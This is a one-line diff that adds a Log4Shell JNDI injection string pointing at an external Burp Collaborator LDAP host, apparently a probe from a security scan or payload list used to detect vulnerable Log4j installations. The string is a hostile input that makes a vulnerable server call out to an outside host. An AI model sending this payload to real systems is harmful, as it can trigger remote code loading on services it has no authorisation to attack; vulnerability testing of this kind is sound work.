@@ -1,0 +1,1 @@
+${jndi:ldap://q.g4lh3agwk6rbys6uk5fnqa2pyg4cy7mw.burpcollaborator.net:99999/s2test}
